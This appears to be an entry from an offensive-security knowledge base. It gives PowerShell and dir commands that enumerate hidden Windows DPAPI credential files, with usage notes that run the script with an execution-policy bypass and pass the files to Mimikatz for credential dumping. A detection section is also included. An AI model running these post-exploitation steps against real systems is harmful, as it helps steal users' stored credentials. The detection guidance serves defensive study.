---
id: e898787a-ebfe-493c-bf36-bbdccf147d78
name: powershell-enumerate-dpapi-credential-files
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:26.245139+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - dpapi
  - enumeration
  - credentials
validated: true
---

# powershell-enumerate-dpapi-credential-files

## Code

```powershell
dir /a:h C:\Users\$_USERNAME\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\$_USERNAME\AppData\Roaming\Microsoft\Credentials\

Get-ChildItem -Hidden C:\Users\$_USERNAME\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\$_USERNAME\AppData\Roaming\Microsoft\Credentials\
```

## Description

This PowerShell script combines Command Prompt 'dir' commands with native PowerShell Get-ChildItem to enumerate hidden DPAPI credential files in both local and roaming user profiles. It provides dual-method verification for reliability in identifying encrypted credential blobs during Windows post-exploitation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_USERNAME | The target Windows username to substitute in paths | 'john.doe' |

## Usage

Save the script as a .ps1 file and execute it in PowerShell on the target system with local user access: `powershell.exe -ExecutionPolicy Bypass -File enumerate-dpapi.ps1`. Review console output for listed files, then proceed to backup or decrypt them using tools like Mimikatz in procedures like credential dumping workflows.

## Detection

- Monitor PowerShell execution logs (Module Logging, Script Block Logging) for Get-ChildItem calls targeting AppData\Microsoft\Credentials paths.
- Audit file access events (Event ID 4663) in protected directories.
- Look for anomalous cmd.exe or powershell.exe processes enumerating user profiles without legitimate application context.

## Related

- [[procedures/Windows-DPAPI-Credential-Files-Enumeration]]
- [[techniques/Credential Dumping|T1003]]
